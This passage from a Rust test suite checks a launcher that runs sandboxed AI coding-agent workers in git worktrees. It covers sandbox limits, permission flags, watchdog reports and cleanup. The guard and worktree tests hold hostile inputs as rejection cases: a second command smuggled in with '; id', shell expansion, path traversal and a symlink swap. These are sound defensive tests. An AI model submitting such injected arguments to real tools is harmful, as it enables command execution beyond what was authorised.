            .into_iter()
            .filter(|r| r["name"] == "r1")
            .collect::<Vec<_>>();
        let mut row = worker_row(
            &l,
            h,
            "w9",
            &sid(100 + case),
            status,
            Some(rng.next() % 30),
            &lines,
        );
        row["name"] = format!("w9{}", rng.text(80)).into();
        rows.push(row);
        l.set_sessions(&rows);
        let out = facts(&l, h);
        let b = blocks(&out);
        assert_eq!(b.len(), 1, "case {case}: {out:?}");
        assert!(b[0].len() <= 2000, "case {case}: {} bytes", b[0].len());
        assert!(
            !b[0].chars().any(|c| c.is_control() && c != '\n'),
            "case {case}: {:?}",
            b[0]
        );
    }

    // invariant: every whole output stays under 9000 bytes whatever the fleet; done and stuck
    // workers come first, every printed block is whole, and the last line counts the rest
    let fat = assistant(serde_json::json!([{"type": "text", "text": "y".repeat(400)}]));
    for n in [0u64, 1, 3, 4, 5, 8, 13, 21, 40] {
        let mut rows = l
            .sessions()
            .into_iter()
            .filter(|r| r["name"] == "r1")
            .collect::<Vec<_>>();
        let mut stuck = 0;
        for i in 0..n {
            let status = if rng.next().is_multiple_of(3) {
                stuck += 1;
                serde_json::json!({"status": "waiting", "waitingFor": "permission prompt"})
            } else {
                serde_json::json!({"status": "busy"})
            };
            rows.push(worker_row(
                &l,
                h,
                &format!("f{i}"),
                &sid(1000 + i),
                status,
                Some(1),
                &vec![fat.clone(); 6],
            ));
        }
        l.set_sessions(&rows);
        let out = facts(&l, h);
        assert!(out.len() < 9000, "{n} workers: {} bytes", out.len());
        let b = blocks(&out);
        let shown = b.len() as u64;
        if shown < n {
            assert!(
                out.ends_with(&format!("\n{} more workers not shown.\n", n - shown)),
                "{n}: {out}"
            );
            let first_busy = b
                .iter()
                .position(|x| x.contains(": busy"))
                .unwrap_or(b.len());
            assert!(
                b[first_busy..].iter().all(|x| x.contains(": busy")),
                "{n}: stuck after busy"
            );
            assert_eq!(
                b[..first_busy].len() as u64,
                stuck.min(shown),
                "{n}: stuck workers not first"
            );
        } else {
            assert_eq!(shown, n, "{out}");
            if n == 0 {
                assert!(out.ends_with("No live worker.\n"));
            }
        }
        for x in &b {
            assert_eq!(x.lines().count(), 7, "{n}: a block was cut: {x}");
        }
    }
}

/// review r1 (B1, I4, nit): facts runs as the watchdog's prompt hook, where an exit 2 would block the
/// prompt: it always exits 0, and says what it could not read instead of reporting a wrong fleet.
#[test]
fn watchdog_facts_never_block_the_prompt_and_say_what_they_cannot_read() {
    let l = watchdog_launcher();
    let home = TempDir::new().unwrap();
    let h = home.path().to_str().unwrap();
    let (ok, out) = l.run_env(&["watchdog", "facts", "r1"], &[("ROUTER_CLAUDE", "/nonexistent/claude"), ("HOME", h)]);
    assert!(ok && out == "Report to r1.\nThe session list cannot be read (claude agents --json).\n", "{out}");

    std::fs::write(l.state.join("sessions.json"), "not json\n").unwrap();
    let n0 = calls(&l.state).len();
    let (ok, out) = l.run_env(&["watchdog", "facts", "r1"], &[("HOME", h)]);
    assert!(ok && out == "Report to r1.\nThe session list cannot be read (claude agents --json).\n", "{out}");
    assert!(calls(&l.state)[n0..].iter().all(|(_, a)| a[0] == "agents"), "an unreadable list stopped a session");

    // a checkout git cannot list: the worktree list is unreadable, never an empty fleet
    let l = watchdog_launcher();
    let mut rows = l.sessions();
    rows.push(serde_json::json!({"id": "w100", "sessionId": sid(1), "name": "w1", "cwd": l.wt, "kind": "background", "status": "busy"}));
    l.set_sessions(&rows);
    let bare = TempDir::new().unwrap();
    std::fs::create_dir_all(bare.path().join("scripts")).unwrap();
    std::fs::copy(root().join("scripts/router-worker.sh"), bare.path().join("scripts/router-worker.sh")).unwrap();
    let o = common::cmd("sh")
        .arg(bare.path().join("scripts/router-worker.sh"))
        .args(["watchdog", "facts", "r1"])
        .env("ROUTER_CLAUDE", &l.stub)
        .env("STUB_STATE", &l.state)
        .env("HOME", h)
        .env("GIT_CEILING_DIRECTORIES", bare.path().parent().unwrap())
        .output()
        .unwrap();
    assert!(o.status.success(), "{o:?}");
    assert_eq!(String::from_utf8_lossy(&o.stdout), "Report to r1.\nThe worktree list cannot be read (git worktree list).\n");
}

/// review r2 I2: facts reads a worker's worktree without taking its index lock, so the worker's own
/// `git add` or `git commit` never meets an index.lock left by the watchdog.
#[test]
fn watchdog_facts_leave_a_workers_index_untouched() {
    use std::os::unix::fs::MetadataExt;
    let l = watchdog_launcher();
    let home = TempDir::new().unwrap();
    let mut rows = l.sessions();
    rows.push(serde_json::json!({"id": "w100", "sessionId": sid(1), "name": "w1", "cwd": l.wt, "kind": "background", "status": "busy"}));
    l.set_sessions(&rows);
    // a stale index: a tracked file's stat no longer matches it, so a plain `git status` rewrites it
    let tracked = std::fs::File::options().write(true).open(l.wt.join(".gitignore")).unwrap();
    tracked.set_modified(std::time::SystemTime::UNIX_EPOCH + Duration::from_secs(1_600_000_000)).unwrap();
    let index = l.main.join(".git/worktrees/wt/index");
    let before = std::fs::metadata(&index).unwrap();
    let out = facts(&l, home.path());
    assert!(out.contains("w1: busy"), "{out}");
    let after = std::fs::metadata(&index).unwrap();
    assert_eq!((before.ino(), before.mtime_nsec()), (after.ino(), after.mtime_nsec()), "facts rewrote the worker's index");
}

/// review r2 I3: a transcript facts cannot stat (it vanished between the glob and the look) costs
/// that worker its quiet minutes, never the rest of the fleet.
#[test]
fn watchdog_facts_keep_the_fleet_when_a_transcript_cannot_be_read() {
    let l = watchdog_launcher();
    let home = TempDir::new().unwrap();
    let h = home.path();
    let mut rows = l.sessions();
    for i in 1..=3 {
        rows.push(worker_row(&l, h, &format!("w{i}"), &sid(i), serde_json::json!({"status": "busy"}), Some(1), &[]));
    }
    l.set_sessions(&rows);
    let shim = l.state.join("nostat");
    std::fs::create_dir_all(&shim).unwrap();
    std::fs::write(shim.join("stat"), "#!/bin/sh\nexit 1\n").unwrap();
    std::fs::set_permissions(shim.join("stat"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    let path = format!("{}:{}", shim.display(), std::env::var("PATH").unwrap());
    let (ok, out) = l.run_env(&["watchdog", "facts", "r1"], &[("HOME", h.to_str().unwrap()), ("PATH", &path)]);
    assert!(ok, "{out}");
    let b = blocks(&out);
    assert_eq!(b.len(), 3, "{out}");
    assert!(b.iter().all(|x| x.contains(": busy · quiet ? · ")), "{out}");
}

/// The one spawn run dir of `name` under the fixture's .router/runs.
fn run_dir(l: &Launcher, name: &str) -> PathBuf {
    let dirs: Vec<PathBuf> = std::fs::read_dir(l.main.join(".router/runs"))
        .unwrap()
        .map(|e| e.unwrap().path())
        .filter(|p| {
            p.file_name()
                .unwrap()
                .to_str()
                .unwrap()
                .starts_with(&format!("{name}-"))
        })
        .collect();
    assert_eq!(dirs.len(), 1, "{name}: {dirs:?}");
    dirs[0].clone()
}

/// The `.router-brief.*` dirs directly under `wt`.
fn brief_copies(wt: &Path) -> Vec<String> {
    std::fs::read_dir(wt)
        .unwrap()
        .map(|e| e.unwrap().file_name().into_string().unwrap())
        .filter(|f| f.starts_with(".router-brief."))
        .collect()
}

/// E-ROUTER3.W8 (DEC-46, points 6 and 7): a worker loads the project's and its worktree's local
/// settings only and no MCP server (probe P1: the user source brought 42 allow entries, the user's
/// plugins and the connectors); its prompt opens with the GIT_ check and asks every network command
/// for a timeout (probe P3: a host outside the sandbox makes the call wait).
#[test]
fn launcher_starts_a_worker_on_project_settings_alone_with_no_mcp_server() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    for (name, extra) in [("a", vec![]), ("p", vec!["--permission-mode", "plan"])] {
        let mut args = vec!["spawn", name, wt, ".router/briefs/b.md", "opus"];
        args.extend(&extra);
        let (ok, out) = l.run(&args);
        assert!(ok && out.contains(" branch=w snapshot="), "{out}");
        let a = worker_argv(&l.state, name);
        for once in ["--setting-sources", "--strict-mcp-config", "--settings"] {
            assert_eq!(
                a.iter().filter(|x| *x == once).count(),
                1,
                "{once} in {a:?}"
            );
        }
        for no in [
            "--mcp-config",
            "--add-dir",
            "--resume",
            "--plugin-dir",
            "--dangerously-skip-permissions",
        ] {
            assert!(!a.iter().any(|x| x == no), "{no} in {a:?}");
        }
        let prompt = a.last().unwrap();
        // the sandbox sets GIT_* of its own (proxy, safe.directory), so the check is where git
        // resolves, not an empty environment (E-ROUTER3.W8 live run)
        assert!(
            prompt.contains(&format!(
                "First action: git rev-parse --show-toplevel must print {} (",
                l.wt.canonicalize().unwrap().display()
            ))
                && prompt.contains("(if it prints anything else, report that and stop)")
                && !prompt.contains("grep ^GIT_"),
            "{prompt}"
        );
        assert!(
            prompt.contains("give every network command a timeout"),
            "{prompt}"
        );
    }
}

/// E-ROUTER3.W8 (DEC-46, points 9 and 13): the worker's shell runs in Claude Code's sandbox, which
/// writes its worktree, the shared git dir but its config and hooks, and cargo's cache, reads no ssh
/// key or push channel, and reaches five hosts. What the sandbox does is probe P3's; this pins the JSON.
#[test]
fn worker_sandbox_writes_only_its_worktree_the_git_dir_and_cargos_cache() {
    let l = launcher();
    let g = l.main.join(".git");
    let g = g.to_str().unwrap();
    let want = serde_json::json!({"sandbox": {
        "enabled": true,
        "autoAllowBashIfSandboxed": true,
        "allowUnsandboxedCommands": false,
        "filesystem": {
            "allowWrite": [g, "~/.cargo"],
            "denyWrite": [format!("{g}/config"), format!("{g}/hooks"), format!("{g}/keel-hooks"), format!("{g}/info"), "~/.cargo/bin"],
            "denyRead": ["~/.ssh", "~/.claude/channels"]
        },
        "network": {"allowedDomains": ["htmldoc.wfomobile.com", "crates.io", "index.crates.io", "static.crates.io", "github.com"]}
    }});
    // a second worktree of the same repository shares its git dir
    for (name, wt) in [("a", &l.wt), ("b", &l.wt2)] {
        let (ok, out) = l.run(&[
            "spawn",
            name,
            wt.to_str().unwrap(),
            ".router/briefs/b.md",
            "opus",
        ]);
        assert!(ok, "{out}");
        let s: serde_json::Value =
            serde_json::from_str(&option(&worker_argv(&l.state, name), "--settings")).unwrap();
        assert_eq!(s, want, "{name}");
    }
}

/// E-ROUTER3.W8 (DEC-46, point 4): the review runs in a fresh `--review` worker, the only one granted
/// the cr note; it gets no edit tool, no `git add` and no `git commit`. Every other worker is denied
/// the cr note.
#[test]
fn only_a_review_worker_is_granted_the_cr_note_and_it_gets_no_edit_tools() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let brief = ".router/briefs/b.md";
    for (i, extra) in [
        vec!["--review", "--review"],
        vec!["--review", "yes"],
        vec!["--review=yes"],
        vec!["--review", "--effort", "high", "--review"],
    ]
    .into_iter()
    .enumerate()
    {
        let name = format!("r{i}");
        let mut args = vec!["spawn", name.as_str(), wt, brief, "opus"];
        args.extend(&extra);
        let (ok, out) = l.run(&args);
        assert!(!ok && out.contains("[--review]"), "{extra:?}: {out}");
        assert_eq!(l.starts(&name), 0, "{extra:?} started a worker");
    }
    let (ok, out) = l.run(&["spawn", "author", wt, brief, "opus"]);
    assert!(ok, "{out}");
    let (ok, out) = l.run(&[
        "spawn", "reviewer", wt, brief, "opus", "--review", "--effort", "high",
    ]);
    assert!(ok, "{out}");
    argv_of(&l.state, "author", false);
    assert_eq!(
        option(&argv_of(&l.state, "reviewer", true), "--effort"),
        "high"
    );
    let review = |name: &str| std::fs::read_to_string(run_dir(&l, name).join("review")).unwrap();
    assert_eq!(
        (review("author"), review("reviewer")),
        ("no\n".to_string(), "yes\n".to_string())
    );
}

/// E-ROUTER3.W8 (DEC-46, point 12; probe P1: a `--bg` session takes the launching shell's
/// environment, and a leaked GIT_DIR silenced the doc hooks). Run with GIT_* naming another
/// repository, every mode acts on its own repository, that one stays byte-identical, and the CLI the
/// launcher runs sees no GIT_* at all.
#[test]
fn launcher_ignores_inherited_git_variables() {
    let l = launcher();
    let other = l.main.parent().unwrap().join("other");
    std::fs::create_dir_all(&other).unwrap();
    git(&other, &["init", "-q", "-b", "main"]);
    std::fs::write(other.join("f"), "x").unwrap();
    git(&other, &["add", "f"]);
    git(&other, &["commit", "-qm", "other"]);
    let state = || -> Vec<Vec<u8>> {
        let mut v: Vec<Vec<u8>> = ["config", "index", "HEAD"]
            .iter()
            .map(|f| std::fs::read(other.join(".git").join(f)).unwrap())
            .collect();
        v.push(git(&other, &["for-each-ref"]).stdout);
        v.push(git(&other, &["worktree", "list", "--porcelain"]).stdout);
        v
    };
    let before = state();
    let o = other.to_str().unwrap();
    let (gd, gi) = (format!("{o}/.git"), format!("{o}/.git/index"));
    let env = [
        ("GIT_DIR", gd.as_str()),
        ("GIT_WORK_TREE", o),
        ("GIT_INDEX_FILE", gi.as_str()),
        ("GIT_AUTHOR_NAME", "leak"),
        ("GIT_EDITOR", "leak"),
        ("GIT_CONFIG_PARAMETERS", "'core.hookspath'='/leak'"),
    ];
    let run = |args: &[&str]| {
        let (ok, out) = l.run_env(args, &env);
        assert!(ok, "{args:?}: {out}");
        out
    };
    let wt = l.wt.to_str().unwrap();
    let out = run(&["spawn", "n", wt, ".router/briefs/b.md", "opus"]);
    assert!(
        out.contains(" branch=w ") && out.contains(&format!(" worktree={wt}")),
        "{out}"
    );
    let mut rows = l.sessions();
    rows.push(serde_json::json!({"id": "r100", "sessionId": "r100-x", "name": "r1", "cwd": l.main, "kind": "background", "status": "idle"}));
    l.set_sessions(&rows);
    let out = run(&["watchdog", "facts", "r1"]);
    assert!(out.contains("n: DONE · quiet ? · w · "), "{out}");
    assert!(run(&["stop", "n"]).starts_with("STOPPED name=n "));
    let p = format!("{}-E-X-w1-a", l.main.display());
    assert!(
        run(&["worktree", "add", "wu/E-X/w1-a"]).starts_with(&format!(
            "WORKTREE path={p} branch=wu/E-X/w1-a base=epic/E-X "
        ))
    );
    assert_eq!(
        run(&["worktree", "remove", "wu/E-X/w1-a"]),
        format!("REMOVED path={p} branch=wu/E-X/w1-a\n")
    );
    assert_eq!(state(), before, "the other repository changed");
    let seen = std::fs::read_to_string(l.state.join("git-env")).unwrap_or_default();
    assert!(seen.is_empty(), "the CLI saw {seen}");
    assert!(
        calls(&l.state).iter().any(|(_, a)| a[0] == "--bg"),
        "no session started"
    );
}

/// E-ROUTER3.W8 (W3 absorbed, backlog R1): a worktree whose branch predates the worker persona would
/// start a session without `--agent worker`'s file, which this repository's settings make a router.
/// Refused before any run dir or brief copy exists; so is a detached worktree (DEC-46 point 15).
#[test]
fn spawn_refuses_a_worktree_without_the_worker_persona() {
    let l = launcher();
    std::fs::remove_file(l.wt.join(".claude/agents/worker.md")).unwrap();
    let (ok, out) = l.run(&[
        "spawn",
        "n",
        l.wt.to_str().unwrap(),
        ".router/briefs/b.md",
        "opus",
    ]);
    assert!(!ok, "{out}");
    assert!(out.contains(&format!("no worker persona in {} (.claude/agents/worker.md): merge the base branch that carries it", l.wt.display())), "{out}");
    git(&l.wt2, &["checkout", "-q", "--detach"]);
    let (ok, out) = l.run(&[
        "spawn",
        "n",
        l.wt2.to_str().unwrap(),
        ".router/briefs/b.md",
        "opus",
    ]);
    assert!(
        !ok && out.contains("has a detached HEAD: a worker runs on a branch"),
        "{out}"
    );
    assert_eq!(l.starts("n"), 0);
    assert!(
        !l.main.join(".router/runs").exists(),
        "a refused spawn left a run dir"
    );
    assert!(brief_copies(&l.wt).is_empty() && brief_copies(&l.wt2).is_empty());
}

/// E-ROUTER3.W8 (W3 absorbed, backlog R6 row 3): two launches of one name in the same second both
/// passed the live check. The lock covers the live check and the start; no lock outlives a launch,
/// whatever its outcome, and another name is not held up.
#[test]
fn a_name_whose_launch_is_in_progress_is_refused_and_no_lock_outlives_a_launch() {
    let l = launcher();
    let (wt, wt2, brief) = (
        l.wt.to_str().unwrap(),
        l.wt2.to_str().unwrap(),
        ".router/briefs/b.md",
    );
    let runs = l.main.join(".router/runs");
    let lock = runs.join(".lock-n");
    std::fs::create_dir_all(&lock).unwrap();
    let (ok, out) = l.run(&["spawn", "n", wt, brief, "opus"]);
    assert!(
        !ok && out.contains(&format!(
            "a launch of n is in progress ({})",
            lock.display()
        )),
        "{out}"
    );
    assert_eq!(l.starts("n"), 0);
    assert!(
        lock.exists(),
        "a refused launch removed the lock it did not take"
    );
    let locks = || {
        std::fs::read_dir(&runs)
            .unwrap()
            .filter(|e| {
                e.as_ref()
                    .unwrap()
                    .file_name()
                    .to_str()
                    .unwrap()
                    .starts_with(".lock-")
            })
            .count()
    };
    // RUNNING, while n's launch holds its lock
    let (ok, out) = l.run(&["spawn", "m", wt, brief, "opus"]);
    assert!(ok && out.starts_with("RUNNING name=m "), "{out}");
    std::fs::remove_dir(&lock).unwrap();
    assert_eq!(locks(), 0, "RUNNING");
    // refused inside the lock: the name is live
    let (ok, out) = l.run(&["spawn", "m", wt2, brief, "opus"]);
    assert!(!ok && out.contains("still running"), "{out}");
    assert_eq!(locks(), 0, "refused");
    // DEAD
    std::fs::write(l.state.join("refuse"), "no\n").unwrap();
    let (ok, out) = l.run(&["spawn", "d", wt, brief, "opus"]);
    assert!(!ok && out.starts_with("DEAD name=d "), "{out}");
    assert_eq!(locks(), 0, "DEAD");
    std::fs::remove_file(l.state.join("refuse")).unwrap();
    // UNLISTED: the live check reads the list, the look after the start cannot
    std::fs::write(l.state.join("agents-ok"), "1").unwrap();
    let (ok, out) = l.run(&["spawn", "u", wt, brief, "opus"]);
    assert!(!ok && out.starts_with("UNLISTED name=u "), "{out}");
    assert_eq!(locks(), 0, "UNLISTED");
}

/// E-ROUTER3.W8 (W3 absorbed, backlog R6 row 2; DEC-46 point 15): stop removes the brief copies its
/// session's run dir records, only a real `.router-brief.XXXXXX` dir directly under that worktree, and
/// leaves another session's; `drift=` names the branch the worktree moved to since the spawn.
#[test]
fn stop_removes_that_sessions_brief_copies_and_reports_branch_drift() {
    let l = launcher();
    let (wt, wt2, brief) = (
        l.wt.to_str().unwrap(),
        l.wt2.to_str().unwrap(),
        ".router/briefs/b.md",
    );
    let copy = |name: &str, wt: &str| {
        let (ok, out) = l.run(&["spawn", name, wt, brief, "opus"]);
        assert!(ok, "{out}");
        PathBuf::from(field(&out, "brief="))
            .parent()
            .unwrap()
            .to_path_buf()
    };
    let (a, b) = (copy("a", wt), copy("b", wt));
    let (ok, out) = l.run(&["stop", "a"]);
    assert!(ok && !out.contains("drift="), "{out}");
    assert!(
        !a.exists() && b.join("brief.md").exists(),
        "a's copy {a:?}, b's copy {b:?}"
    );

    git(&l.wt, &["switch", "-q", "-c", "other"]);
    let (ok, out) = l.run(&["stop", "b"]);
    assert!(ok && out.ends_with(" drift=other\n"), "{out}");
    assert!(!b.exists());
    assert!(brief_copies(&l.wt).is_empty(), "{:?}", brief_copies(&l.wt));

    // a recorded copy swapped for a symlink is not followed
    let victim = l.main.parent().unwrap().join("victim");
    std::fs::create_dir_all(&victim).unwrap();
    std::fs::write(victim.join("keep"), "x").unwrap();
    let c = copy("c", wt2);
    std::fs::remove_dir_all(&c).unwrap();
    std::os::unix::fs::symlink(&victim, &c).unwrap();
    l.stop("c");
    assert!(
        victim.join("keep").exists(),
        "stop followed a symlinked copy"
    );
    // a recorded path outside the worktree is not removed
    let outside = l.main.parent().unwrap().join(".router-brief.ABCDEF");
    std::fs::create_dir_all(&outside).unwrap();
    copy("e", wt2);
    let rd = run_dir(&l, "e");
    let set_mode = |p: &Path, m: u32| {
        std::fs::set_permissions(p, std::os::unix::fs::PermissionsExt::from_mode(m)).unwrap()
    };
    set_mode(&rd, 0o755);
    set_mode(&rd.join("brief-copy"), 0o644);
    std::fs::write(rd.join("brief-copy"), format!("{}\n", outside.display())).unwrap();
    l.stop("e");
    assert!(outside.exists(), "stop removed a path outside the worktree");
}

/// E-ROUTER3.W8 (DEC-46, points 2 and 3): the router creates a worktree for an epic or WU branch
/// only, off its fixed base (main, or the WU's epic), at the path derived from the branch; an
/// existing branch is checked out as it is. A refusal creates nothing.
#[test]
fn worktree_add_cuts_an_epic_or_wu_branch_off_its_base_at_the_derived_path() {
    let l = launcher();
    let m = l.main.to_str().unwrap();
    let tip = |r: &str| {
        String::from_utf8(git(&l.main, &["rev-parse", r]).stdout)
            .unwrap()
            .trim()
            .to_string()
    };
    git(
        &l.main,
        &["commit", "-q", "--allow-empty", "-m", "main moves on"],
    );
    git(&l.main, &["branch", "wu/E-X/w2-b", "main"]);
    for (b, path, base, at) in [
        (
            "wu/E-X/w1-a",
            format!("{m}-E-X-w1-a"),
            "epic/E-X",
            tip("epic/E-X"),
        ),
        ("epic/E-Y", format!("{m}-E-Y"), "main", tip("main")),
        (
            "wu/E-X/w2-b",
            format!("{m}-E-X-w2-b"),
            "epic/E-X",
            tip("main"),
        ),
    ] {
        let (ok, out) = l.run(&["worktree", "add", b]);
        assert!(ok, "{out}");
        assert_eq!(
            out.lines().last().unwrap(),
            format!("WORKTREE path={path} branch={b} base={base} tip={at}")
        );
        assert_eq!(
            String::from_utf8(git(Path::new(&path), &["branch", "--show-current"]).stdout)
                .unwrap()
                .trim(),
            b
        );
        assert_eq!(tip(b), at, "{b}");
    }
    assert_ne!(tip("epic/E-X"), tip("main"));
    let (ok, out) = l.run(&[
        "spawn",
        "n",
        &format!("{m}-E-X-w1-a"),
        ".router/briefs/b.md",
        "opus",
    ]);
    assert!(ok && out.contains(" branch=wu/E-X/w1-a "), "{out}");

    git(
        &l.main,
        &["worktree", "add", "-q", "../elsewhere", "-b", "wu/E-X/w3-c"],
    );
    std::fs::create_dir_all(format!("{m}-E-X-w4-d")).unwrap();
    let shape = "branch must be epic/<E> or wu/<E>/<slug> in plain words";
    let snapshot = || {
        let mut d: Vec<String> = std::fs::read_dir(l.main.parent().unwrap())
            .unwrap()
            .map(|e| e.unwrap().file_name().into_string().unwrap())
            .collect();
        d.sort();
        (
            d,
            git(&l.main, &["worktree", "list", "--porcelain"]).stdout,
            git(&l.main, &["for-each-ref"]).stdout,
        )
    };
    let before = snapshot();
    for (args, why) in [
        (vec!["feature/x"], shape.to_string()),
        (vec!["main"], shape.into()),
        (vec!["wu/E-X"], shape.into()),
        (vec!["wu/E-X/a/b"], shape.into()),
        (vec!["epic/E..X"], shape.into()),
        (vec!["epic/-x"], shape.into()),
        (vec!["epic/E X"], shape.into()),
        (vec!["epic/E-X\nwu/E-X/w9"], shape.into()),
        (vec!["epic/"], shape.into()),
        (
            vec!["epic/E-X.lock"],
            "not a valid branch name: epic/E-X.lock".into(),
        ),
        (
            vec!["wu/E-Z/w1"],
            "base branch epic/E-Z does not exist".into(),
        ),
        (
            vec!["wu/E-X/w3-c"],
            format!(
                "branch wu/E-X/w3-c is checked out at {}",
                l.main.parent().unwrap().join("elsewhere").display()
            ),
        ),
        (vec!["wu/E-X/w4-d"], format!("path {m}-E-X-w4-d exists")),
        (vec![], "worktree add|remove <branch>".into()),
        (vec!["epic/E-Q", "x"], "worktree add|remove <branch>".into()),
    ] {
        let mut a = vec!["worktree", "add"];
        a.extend(&args);
        let (ok, out) = l.run(&a);
        assert!(
            !ok && out.contains(&why),
            "{args:?} not refused for {why}: {out}"
        );
    }
    let (ok, out) = l.run(&["worktree", "move", "epic/E-Q"]);
    assert!(!ok && out.contains("worktree add|remove <branch>"), "{out}");
    assert!(
        before == snapshot(),
        "a refused worktree add changed the repository or its parent dir"
    );
}

/// E-ROUTER3.W8 (DEC-46, point 5): the router removes only a clean worktree whose branch is merged
/// into its base and in which no session runs, never its own checkout or the main one; the branch stays.
#[test]
fn worktree_remove_takes_only_a_clean_merged_worktree_with_no_session_in_it() {
    let l = launcher();
    let b = "wu/E-X/w1-a";
    let (ok, out) = l.run(&["worktree", "add", b]);
    assert!(ok, "{out}");
    let p = PathBuf::from(field(&out, "path="));
    let refused = |why: &str| {
        let (ok, out) = l.run(&["worktree", "remove", b]);
        assert!(!ok && out.contains(why), "not refused for {why}: {out}");
        assert!(p.join(".git").exists(), "{why}: the worktree is gone");
    };
    let (ok, out) = l.run(&[
        "spawn",
        "n",
        p.to_str().unwrap(),
        ".router/briefs/b.md",
        "opus",
    ]);
    assert!(ok, "{out}");
    refused(&format!("a session runs in {}: stop it first", p.display()));
    l.stop("n");
    std::fs::write(l.state.join("agents-ok"), "0").unwrap();
    refused("cannot list sessions (claude agents --json)");
    std::fs::remove_file(l.state.join("agents-ok")).unwrap();
    std::fs::write(p.join("new.txt"), "x").unwrap();
    refused("has uncommitted changes: the owner decides");
    std::fs::remove_file(p.join("new.txt")).unwrap();
    git(&p, &["commit", "-q", "--allow-empty", "-m", "wu work"]);
    refused("branch wu/E-X/w1-a is not merged into epic/E-X: the owner decides");
    git(&l.main, &["branch", "-f", "epic/E-X", b]);
    let (ok, out) = l.run(&["worktree", "remove", "epic/E-X"]);
    assert!(
        !ok && out.contains("branch epic/E-X is checked out in no worktree"),
        "{out}"
    );

    // the launcher's own checkout and the main one, with a router in a linked worktree
    git(&l.main, &["switch", "-q", "-c", "epic/E-M"]);
    git(&l.wt2, &["switch", "-q", "-c", "epic/E-R"]);
    for (branch, why) in [
        ("epic/E-R", "may not remove the router's own checkout"),
        ("epic/E-M", "may not remove the repository's main checkout"),
    ] {
        let o = l
            .cmd(&["worktree", "remove", branch], &[])
            .current_dir(&l.wt2)
            .output()
            .unwrap();
        assert!(
            !o.status.success() && String::from_utf8_lossy(&o.stderr).contains(why),
            "{branch}: {o:?}"
        );
    }

    // an ignored archive of distilled docs blocks: git worktree remove would delete it
    let exclude = l.main.join(".git/info/exclude");
    let mut ex = std::fs::read_to_string(&exclude).unwrap_or_default();
    ex.push_str("\ndocs/.archive/\n");
    std::fs::write(&exclude, ex).unwrap();
    std::fs::create_dir_all(p.join("docs/.archive")).unwrap();
    std::fs::write(p.join("docs/.archive/plan.html"), "x").unwrap();
    refused("holds archived docs in docs/.archive: copy them out first");
    std::fs::remove_dir_all(p.join("docs/.archive")).unwrap();

    // an ignored build dir does not block
    std::fs::create_dir_all(p.join("target/debug")).unwrap();
    std::fs::write(p.join("target/debug/x"), "x").unwrap();
    let (ok, out) = l.run(&["worktree", "remove", b]);
    assert_eq!(
        (ok, out.as_str()),
        (
            true,
            format!("REMOVED path={} branch={b}\n", p.display()).as_str()
        )
    );
    assert!(!p.exists());
    assert!(
        !String::from_utf8(git(&l.main, &["worktree", "list"]).stdout)
            .unwrap()
            .contains(p.to_str().unwrap())
    );
    git(&l.main, &["rev-parse", "--verify", "-q", b]);
}

#[test]
fn router_guard_admits_the_two_worktree_shapes_in_plain_words_only() {
    for ok in [
        "scripts/router-worker.sh worktree add epic/E-X",
        "scripts/router-worker.sh worktree add wu/E-X/w1-a",
        "scripts/router-worker.sh worktree remove epic/E-X",
        "scripts/router-worker.sh worktree remove wu/E-X/w1-a",
    ] {
        assert_eq!(bash(ok), None, "guard denied {ok:?}");
    }
    for no in [
        "scripts/router-worker.sh worktree add",
        "scripts/router-worker.sh worktree remove",
        "scripts/router-worker.sh worktree add epic/E-X wu/E-X/w1-a",
        "scripts/router-worker.sh worktree add feature/x",
        "scripts/router-worker.sh worktree add main",
        "scripts/router-worker.sh worktree add wu/../x",
        "scripts/router-worker.sh worktree add epic/E..X",
        "scripts/router-worker.sh worktree add -b epic/E-X",
        "scripts/router-worker.sh worktree add \"epic/E-X\"",
        "scripts/router-worker.sh worktree add epic/$USER",
        "scripts/router-worker.sh worktree add epic/E-X; id",
        "scripts/router-worker.sh worktree prune",
        "scripts/router-worker.sh worktree list",
        "scripts/router-worker.sh worktree move epic/E-X",
        "scripts/router-worker.sh worktreex add epic/E-X",
    ] {
        assert!(bash(no).is_some(), "guard allowed {no:?}");
    }
    assert!(bash("scripts/router-worker.sh worktree prune")
        .unwrap()
        .contains("worktree add|remove <epic/E or wu/E/slug>"));
}

/// E-ROUTER3.W8 (DEC-46, point 2): the launcher's branch words are the committed branch policy, and
/// whatever name it accepts derives a path beside the main checkout, never into or above another dir.
#[test]
fn worktree_branches_follow_the_committed_branch_policy() {
    let sh = std::fs::read_to_string(root().join("scripts/router-worker.sh")).unwrap();
    let line = sh.lines().find(|l| l.starts_with("main_b=")).unwrap();
    let launcher_words: Vec<&str> = line
        .split(' ')
        .map(|w| w.split_once('=').unwrap().1)
        .collect();
    let config = std::fs::read_to_string(root().join(".keel/config.toml")).unwrap();
    let value = |k: &str| {
        config
            .lines()
            .skip_while(|l| !l.starts_with("[branches]"))
            .find_map(|l| l.strip_prefix(&format!("{k} = \"")))
            .map(|v| v.split('"').next().unwrap())
            .unwrap()
    };
    assert_eq!(
        launcher_words,
        [value("main"), value("epic_prefix"), value("wu_prefix")]
    );

    let l = launcher();
    let parent = l.main.parent().unwrap();
    let mut rng = Rng(0x5eed_0008);
    let mut accepted = 0;
    for _ in 0..40 {
        let head = ["epic/", "wu/E-X/", "wu/", "Epic/", "", "-"][rng.next() as usize % 6];
        let body: String = (0..1 + rng.next() % 6)
            .map(|_| ["a", "Z", "0", ".", "-", "_", "/"][rng.next() as usize % 7])
            .collect();
        let name = format!("{head}{body}");
        let (ok, out) = l.run(&["worktree", "add", &name]);
        if name.contains("..") || name.matches('/').count() > 2 {
            assert!(!ok, "{name:?} accepted: {out}");
        }
        if ok {
            accepted += 1;
            let path = PathBuf::from(field(&out, "path="));
            assert_eq!(path.parent(), Some(parent), "{name:?}: {out}");
            assert!(
                path.file_name()
                    .unwrap()
                    .to_str()
                    .unwrap()
                    .starts_with("main-"),
                "{name:?}: {out}"
            );
        }
    }
    assert!(accepted > 0, "no generated name was accepted");
}
